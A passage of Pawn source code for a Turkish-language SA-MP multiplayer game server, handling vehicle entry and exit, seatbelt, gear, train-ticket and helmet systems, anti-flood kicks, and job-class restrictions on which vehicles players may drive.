     	SendClientMessage(playerid, -1, "{{FFCC00}» {FFFFFF}Vites Yukseltmek icin {FFCC00}'NUMPAD 8'{FFFFFF} Düsürmek Ýcin {FFCC00}'NUMPAD 2' !");
     	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Otomatik Vites icin {FFCC00}'/otomatikvites'{FFFFFF} yazabilirsiniz !");
	}
	else
	{
		//SendClientMessage(playerid, -1, "{FF0000}[Vites Sistemi] ! {00FF00}Otomatik Vites Kullaniyorsunuz Manuel icin {FFFFFF}'/manuelvites'{00FF00} yazabilirsiniz!");
	}

	new engine, lights, alarm, doors, bonnet, boot, objective;

	//Anti car Jack
	if(!ispassenger)
	{
		new VDriver = GetVehicleDriver2(vehicleid);
		if(VDriver != -1)
		{
			if(GetPlayerTeam(VDriver) == GetPlayerTeam(playerid))
 			{
				new Float:X,Float:Y,Float:Z;
  				GetPlayerPos(playerid,X,Y,Z);
    			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Arac Dolu Sadece Yolcu Olarak Binebilirsiniz !");
     			SetPlayerPos(playerid,X,Y,Z+1);
    		}
		}
	}
	


	if(APlayerData[playerid][PlayerClass] != ClassPolice)
	{
	    if(Flashing[vehicleid] == true)
	    {
			KillTimer(FlashTime[vehicleid]);
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicleid, engine, 0, 0, doors, bonnet, boot, objective);
 			SetVehicleParamsEx(vehicleid, engine, 1, 0, doors, bonnet, boot, objective);
 			Flashing[vehicleid] = false;
		}
	}

	if(VehicleIsLocked[vehicleid] == 1)
	{
	    SendClientMessage(playerid,-1," Bu Arac Kilitli ");
	}

	// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
	GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
	APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
	//kemer
	SeatbeltStatus[playerid] = 0;

	return 1;
}



// This callback gets called when a player exits his vehicle
public OnPlayerExitVehicle(playerid, vehicleid)
{
	// Setup local variables
	new engine, lights, alarm, doors, bonnet, boot, objective, string[50 + MAX_PLAYER_NAME];

    if(VehicleIsLocked[vehicleid] == 1)
	{
	    SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Aractan Ýndiniz Arac Kapýlarý Acýldý. ");
	    for(new i;i < MAX_PLAYERS;i++)
	    {
	    	SetVehicleParamsForPlayer(vehicleid,i,0,0);
			VehicleIsLocked[vehicleid] = 0;
		}
	}

	// Check if the player is the driver of the vehicle
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Turn off the lights and engine
		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(vehicleid, engine, 0, alarm, doors, bonnet, boot, objective);
	}

    if(tiryazi[playerid] == 1 || polisyazi[playerid] == 1 || asiriyazi[playerid] == 1)
	{
    	if(polisyazi[playerid] == 1) Delete3DTextLabel(PolisLabel[playerid]);
    	if(tiryazi[playerid] == 1) Delete3DTextLabel(TirciLabel[playerid]);
    	if(asiriyazi[playerid] == 1) Delete3DTextLabel(AsiriLabel[playerid]);
		SendClientMessage(playerid, 0xFF0000FF, "{FFCC00}» {FFFFFF}Aractan Ýndiginizde Arac Yaziniz Otomatik Silinir");
		tiryazi[playerid] = 0;
		polisyazi[playerid] = 0;
		asiriyazi[playerid] = 0;
	}


	// Chech if the player is a pilot
	if (APlayerData[playerid][PlayerClass] == ClassPilot)
	{
	    // If the pilot started a job --> as soon as a pilot leaves his plane while doing a job, he fails his mission
		if (APlayerData[playerid][JobStarted] == true)
		{
		    // End the job (clear data)
			Pilot_EndJob(playerid);
			// Inform the player that he failed the mission
			GameTextForPlayer(playerid, TXT_FailedMission, 5000, 4);
			// Reduce the player's cash by 1000
			RewardPlayer(playerid, -1000, 0);
		}
	}
	if (APlayerData[playerid][PlayerClass] == ClassFire)
	{
	    // If the G started a job --> as soon as a pilot leaves his plane while doing a job, he fails his mission
		if (APlayerData[playerid][JobStarted] == true)
		{
		    // End the job (clear data)
			Fire_EndJob(playerid);
			// Inform the player that he failed the mission
			GameTextForPlayer(playerid, TXT_FailedMission, 5000, 4);
			// Reduce the player's cash by 1000
			RewardPlayer(playerid, -1000, 0);
		}
	}
	//kemer sistemi
 	if(SeatbeltStatus[playerid] == 1)
  	{
        format(string, sizeof(string), "{FFCC00}» {FFCC00}%s {FFFFFF}Kemerini Cikardi.", GetPlayerNameEx(playerid));
        SCBubble(playerid,string,true,0xFFFF00AA,10,5000);
        SendClientMessage(playerid, COLOR_WHITE, "{FFCC00}» {FFFFFF}Kemerini Cikardin.");
    }

	return 1;
}



// This callback gets called whenever a vehicle enters the water or is destroyed (explodes)
public OnVehicleDeath(vehicleid)
{
	// Sinyal Sistemi
	 if(B_IsTrailer(vehicleid))
    {
        new veh;
        if((veh = TrailerVehicle[vehicleid]) != 0)
        {
            if(IsCarBlinking(veh))
            {
                DestroyDynamicObject(Blink[veh][1]);
                DestroyDynamicObject(Blink[veh][3]);
                Blink[veh][1] = -1;
                Blink[veh][3] = -1;
            }
        }
    }
    else DisableCarBlinking(vehicleid);
    
    
		new Component;
		for(new i; i < 14; i++)
		{
			Component = GetVehicleComponentInSlot(vehicleid, i);
			ChangeVehiclePaintjob(vehicleid, 3);
			if(Component != 0)
			{
			RemoveVehicleComponent(vehicleid, Component);
			}
  		}

	// Çöpçü Mesleði
	switch(GetVehicleModel(vehicleid))
	{
	    case 408: OnCopcuVehicleDeath(vehicleid); // Çöpçü Mesleði
	    case 482: OnKargocuVehicleDeath(vehicleid); // Meslek : Kargocu
	}
	new gid;
	for(new i; i<MAX_PLAYERS; i++)
	{
	    if(PilotUcak[i] == vehicleid) gid = i;

	}
    if (APlayerData[gid][PlayerClass] == ClassPilot)
	{
	    if (APlayerData[gid][JobStarted] == true)
		{
		    Pilot_EndJob(gid);
		    SendServerMessage(gid, "{FFCC00}» {FFFFFF}Uçak patladýðý için göreviniz iptal oldu!");
		}
	}
	

	//ANTI POLICE LIGHT
	if(Flashing[vehicleid] == true)
	{
		new panels, doors, lights, tires;

		KillTimer(FlashTime[vehicleid]);

		GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
  		UpdateVehicleDamageStatus(vehicleid, panels, doors, 0, tires);

		Flashing[vehicleid] = false;
	}

	return 1;
}


// This callback gets called when the player changes state
DurumAMK(playerid)
{
	SetTimerEx("DurumAMK_", 2000, false, "i", playerid);
}

forward DurumAMK_(playerid);
public DurumAMK_(playerid)
{
	DurumDurdur[playerid] = 0;
}

stock ModifyVehicleSpeed(vehicleid,mph) //Miles Per Hour
{
        new Float:Vx,Float:Vy,Float:Vz,Float:DV,Float:multiple;
        GetVehicleVelocity(vehicleid,Vx,Vy,Vz);
        DV = floatsqroot(Vx*Vx + Vy*Vy + Vz*Vz);
        if(DV > 0) //Directional velocity must be greater than 0 (display strobes if 0)
        {
                multiple = ((mph + DV * 100) / (DV * 100)); //Multiplying DV by 100 calculates speed in MPH
                return SetVehicleVelocity(vehicleid,Vx*multiple,Vy*multiple,Vz*multiple);
        }
        return 0;
}


stock GetVehicleSpeed(vehicleid, get3d)
{
        new Float:x, Float:y, Float:z;
        GetVehicleVelocity(vehicleid, x, y, z);
        return SpeedCheck(x, y, z, 100.0, get3d);
}

public OnPlayerStateChange(playerid,newstate,oldstate)
{
	// Sinyal Sistemi
    if(oldstate == PLAYER_STATE_DRIVER)
    {
        #if BLINK_DISABLE_ON_EXIT_VEHICLE == 0
        return 1;
        #else
        if(BlinkSide[GetPVarInt(playerid, "blink-car")] != 2) DisableCarBlinking(GetPVarInt(playerid, "blink-car"));
        #endif
    }
    if(newstate == PLAYER_STATE_DRIVER)
	{
	    // Araç Sahiplik Sistemi
	    if(Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == true)
	    {
	        new id = GetPlayerVehicleID(playerid);
	        new ASHPID = Araclar[ GetPlayerVehicleID(playerid) ][AracSHPID];

			if(strfind(AracSHP[ASHPID][ASHPSahip], "Meslek", true) == -1)
			{
	        	if(!strcmp(AracSHP[ASHPID][ASHPSahip], GetName(playerid), true))
	        	{
	            	Bilgi(playerid, "Aracýnýza bindiniz.");
	            	
	            	new Namee[50], Msg[1024];
					GetPlayerName(playerid, Namee, sizeof(Namee));

					format(Msg, 128, SahibisinTXT, VehNames[ AracSHP[ASHPID][ASHPModel] - 400 ], AracSHP[Araclar[id][AracSHPID]][KM]);
				    SendClientMessage(playerid, COLOR_ORANGE, Msg);
				    format(Msg, 128, MotorBildirimi);
					SendClientMessage(playerid, COLOR_ORANGE, Msg);
	        	}else{
	            	new Yazi[128];

					if(!strcmp(AracSHP[ASHPID][ASHPSahip], "-", true))
   					{
      					format(Yazi, 128, "Model: {00CED1}%s  {ADFF2F}Fiyat: {00CED1}%d$", VehNames[ AracSHP[ASHPID][ASHPModel] - 400 ], AracSHP[AYSItemID[playerid]][ASHPFiyat]);
						Bilgi(playerid, Yazi);
    					Bilgi(playerid, "{FFCC00}» {FFFFFF}Bu aracýn sahibi yok! Satýn almak için {FFCC00}/asatinal");
       				}else{
        				if(AracSHP[ASHPID][ASHPIzin] == 1)
         				{
              				format(Yazi, 128, AracinSahibiKMTXT, AracSHP[ASHPID][ASHPSahip], AracSHP[Araclar[id][AracSHPID]][KM]);
				    		SendClientMessage(playerid, COLOR_ORANGE, Yazi);
				    		format(Yazi, 128, "Bu araç {00CED1}%s{ADFF2F}'a ait ve aracýna baþkalarýnýn binmesini istemiyor!", AracSHP[ASHPID][ASHPSahip]);
              				Bilgi(playerid, Yazi);
	                    	if(APlayerData[playerid][PlayerLevel] < 6) RemovePlayerFromVehicle(playerid);
          				}else{
          				    format(Yazi, 128, AracinSahibiKMTXT, AracSHP[ASHPID][ASHPSahip], AracSHP[Araclar[id][AracSHPID]][KM]);
				    		SendClientMessage(playerid, COLOR_ORANGE, Yazi);
				    		format(Yazi, 128, MotorBildirimi);
							SendClientMessage(playerid, COLOR_ORANGE, Yazi);
	                    	format(Yazi, 128, "Bu araç {00CED1}%s{ADFF2F}'a ait.", AracSHP[ASHPID][ASHPSahip]);
	                    	Bilgi(playerid, Yazi);
	            		}
					}
	        	}
			}
	    }else{ SendClientMessage(playerid, COLOR_ORANGE, MotorBildirimi); }
	}

	// SpeedoMeter Sistemi
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(APlayerSpawnData[playerid] == true && TextKapat[playerid] == 0)
	    {
		    ShowPlayerSpeedo(playerid);
		}

  		foreach(new i : Player)
		{
			if(APlayerData[i][PlayerLevel] == 0 && Root[i] == 0) continue;
			if(APlayerData[i][Spectating] == false) continue;
			if(APlayerData[i][SpectateID] == playerid)
			{
				PlayerTextDrawShow(i, Speedo_Speed[i]);
			}
		}
	}

	if(oldstate == PLAYER_STATE_DRIVER)
	{
	    if(APlayerSpawnData[playerid] == true && TextKapat[playerid] == 0)
	    {
	    	HidePlayerSpeedo(playerid);
		}

  		foreach(new i : Player)
		{
			if(APlayerData[i][PlayerLevel] == 0 && Root[i] == 0) continue;
			if(APlayerData[i][Spectating] == false) continue;
			if(APlayerData[i][SpectateID] == playerid)
			{
				PlayerTextDrawHide(i, Speedo_Speed[i]);
			}
		}
	}

	if(SilahIzni[playerid] != 1)
 	{
  		if(g_Flags[playerid] & e_Play)
    	{
	    }else if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
			ResetPlayerWeapons(playerid);
		}
	}

	//vites sistemi
	if(otovites[playerid] == 0)
	{
		if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_DRIVER && !IsVehiclePlane(GetPlayerVehicleID(playerid))) // Player entered a vehicle as a driver
	    {
	        PlayerCGear[playerid] = 1;
	        PlayerCDGear[playerid] = 1;
			PlayerGear[playerid] = 1;
	    }
	    else if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER)
		{
		    PlayerCGear[playerid] = 1;
		    PlayerCDGear[playerid] = 1;
			PlayerGear[playerid] = 1;
		}
	}

	// Tren Sistemi
	new arabaid = GetPlayerVehicleID(playerid);
	new Float:slx, Float:sly, Float:slz;
	GetPlayerPos(playerid, slx, sly, slz);
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		if(LSSFTreni(arabaid) || LSLVTreni(arabaid) || LVLSTreni(arabaid) || LVSFTreni(arabaid) || SFLVTreni(arabaid) || SFLSTreni(arabaid) || GetVehicleModel(arabaid) == 570)
		{
	    	if(Bilet[playerid] == 1)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için LS'den SF'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
	    	else if(Bilet[playerid] == 2)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için LS'den LV'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
	    	else if(Bilet[playerid] == 3)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için LV'den LS'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
	    	else if(Bilet[playerid] == 4)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için LV'den SF'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
	    	else if(Bilet[playerid] == 5)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için SF'den LV'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
	    	else if(Bilet[playerid] == 6)
			{
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hoþ geldiniz.Biletiniz olduðu için SF'den LS'ye gidiyorsunuz.Lütfen Trenin kalkmasýný bekleyin");
                Bilet[playerid] = 1475;
			}
			else
			{
			    Bilet[playerid] = 1475;
			    SetPlayerPos(playerid, slx+5, sly+5, slz+5);
		        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Biletiniz olmadýðý için yolculuk edemezsiniz.");
			}
		}
	}

	// Anti Flood Sistemi
	new Yazi[256];

	if(DurumDurdur[playerid] == 1)
	{
	    DegisenDurum[playerid]++;
	    if(DegisenDurum[playerid] == 5)
	    {
	        format(Yazi, 256, "{{FFCC00}» {FFCC00}%s {FFFFFF}sunucudan tekmelendi ( Durum Deðiþtirme Flood )", GetName(playerid));
	        SendClientMessageToAll(-1, Yazi);

	        printf("[KICK] %s(%d) ( Durum Flood )", GetName(playerid), playerid);
	        SafeKick(playerid);
			return 1;
		}
	}else{
		DegisenDurum[playerid] = 1;
	}

	DurumDurdur[playerid] = 1;
	DurumAMK(playerid);

	//Kask Sistemi

	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
	    if(IsABike(GetPlayerVehicleID(playerid)))
	    {
			switch(GetPlayerSkin(playerid))
			{
		        #define SPAO{%0,%1,%2,%3,%4,%5} SetPlayerAttachedObject(playerid, SLOT, 18645, 2, (%0), (%1), (%2), (%3), (%4), (%5));
				case 0, 65, 74, 149, 208, 273:  SPAO{0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000}
				case 1..6, 8, 14, 16, 22, 27, 29, 33, 41..49, 82..84, 86, 87, 119, 289: SPAO{0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}
				case 7, 10: SPAO{0.090000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 9: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 11..13: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 15: SPAO{0.059999, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 17..21: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 23..26, 28, 30..32, 34..39, 57, 58, 98, 99, 104..118, 120..131: SPAO{0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 40: SPAO{0.050000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 50, 100..103, 148, 150..189, 222: SPAO{0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 51..54: SPAO{0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 55, 56, 63, 64, 66..73, 75, 76, 78..81, 133..143, 147, 190..207, 209..219, 221, 247..272, 274..288, 290..293: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 59..62: SPAO{0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 77: SPAO{0.059999, 0.019999, 0.000000, 87.000000, 82.000000, 0.000000}
				case 85, 88, 89: SPAO{0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 90..97: SPAO{0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 132: SPAO{0.000000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 144..146: SPAO{0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 220: SPAO{0.029999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 223, 246: SPAO{0.070000, 0.050000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 224..245: SPAO{0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 294: SPAO{0.070000, 0.019999, 0.000000, 91.000000, 84.000000, 0.000000}
				case 295: SPAO{0.050000, 0.019998, 0.000000, 86.000000, 82.000000, 0.000000}
				case 296..298: SPAO{0.064999, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 299: SPAO{0.064998, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
		    }
		}
	}
	else
	{
		RemovePlayerAttachedObject(playerid, SLOT);
	}

	// FPS Kamerasý
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		if(OyuncuAFPS[playerid] == 1)
		{
			OyuncuAFPS[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			DestroyPlayerObject(playerid, OyuncuAFPS_Obje[playerid]);
		}
	}
	/*
	new YeniDurumTick = GetTickCount();
	if(YeniDurumTick - SonDurumTick[playerid] < 2000)
	{
	    DegisenDurum[playerid]++;
	    if(DegisenDurum[playerid] == 5)
	    {
	        format(Yazi, 256, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Durum Deðiþtirme Flood )", GetName(playerid));
	        SendClientMessageToAll(-1, Yazi);

	        printf("[KICK] %s(%d) ( Durum Flood )", GetName(playerid), playerid);
	        SafeKick(playerid);
			return 1;
		}
	}else{
		DegisenDurum[playerid] = 1;
	}

	SonDurumTick[playerid] = YeniDurumTick;
	*/

	// Setup local variables
	new vid, Name[24], Msg[128], engine, lights, alarm, doors, bonnet, boot, objective;

	switch (newstate)
	{
		case PLAYER_STATE_DRIVER: // Player became the driver of a vehicle
		{
			// Get the ID of the player's vehicle
			vid = GetPlayerVehicleID(playerid);
			// Get the player's name (the one who is trying to enter the vehicle)
			GetPlayerName(playerid, Name, sizeof(Name));

			// Check if the vehicle is owned
			if (AVehicleData[vid][Owned] == true)
			{
				// Check if the vehicle is owned by somebody else (strcmp will not be 0)
				if (strcmp(AVehicleData[vid][Owner], Name, false) != 0  && APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0)
				{
					// Force the player out of the vehicle
					RemovePlayerFromVehicle(playerid);
					// Turn off the lights and engine
					GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
					// Let the player know he cannot use somebody else's vehicle
					format(Msg, 128, TXT_SpeedometerCannotUseVehicle, AVehicleData[vid][Owner]);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}

				// Check if the vehicle is clamped
				if (AVehicleData[vid][Clamped] == true)
				{
					// Force the player out of the vehicle
					RemovePlayerFromVehicle(playerid);
					// Turn off the lights and engine
					GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
					// Let the player know he cannot use a clamped vehicle
					format(Msg, 128, TXT_SpeedometerClampedVehicle);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					format(Msg, 128, TXT_SpeedometerClampedVehicle2);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
			}

			// Check if the player is not a cop
			if (APlayerData[playerid][PlayerClass] != ClassPolice)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought cop-car that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a cop vehicle
					switch (GetVehicleModel(vid))
					{
						case VehiclePoliceLSPD, VehiclePoliceSFPD, VehiclePoliceLVPD, VehicleHPV1000, VehiclePoliceRanger:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Polis Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
            if (APlayerData[playerid][PlayerClass] != ClassFBY)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought cop-car that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a FBY vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleFBIRancher, VehicleFBITruck, VehicleSWAT, VehicleEnforcer:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Cevuk Kuvvet Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassPilot)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleShamal, VehicleNevada, VehicleStuntPlane, VehicleDodo, VehicleMaverick, VehicleCargobob:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Pilot Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassBusDriver)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleCoach:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Otobüs Söförü Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			if (APlayerData[playerid][PlayerClass] != ClassDolmusDriver)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleCamper:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Dolmuþ Söförü Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassMafia)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleMoonbeam, VehicleSandKing:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Mafia Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassTruckDriver)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleDFT30, VehicleCementTruck:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Tirci Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassRoadWorker)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleUtilityVan , VehicleUtilityTrailer:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Yol Iscisi Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassCopcu)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleTrash:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Copcu Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
			if (APlayerData[playerid][PlayerClass] != ClassBanka && APlayerData[playerid][PlayerClass] != ClassMafia)
			{
				// First check if the vehicle is a static vehicle (player can still use a bought plane that he bought in his house,
				// as a bought vehicle isn't static)
				if (AVehicleData[vid][StaticVehicle] == true)
				{
					// Check if the entered vehicle is a plane or helicopter vehicle
					switch (GetVehicleModel(vid))
					{
						case VehicleSecuricar:
						{
							// Force the player out of the vehicle
							RemovePlayerFromVehicle(playerid);
							// Turn off the lights and engine
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, engine, 0, alarm, doors, bonnet, boot, objective);
							// Let the player know he cannot use a cop car
							SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Bankaci Olmadýgýnýz Icýn Bu Aracý Kullanamazsýnýz.");
						}
					}
				}
			}
			// Check if the player is not a pilot
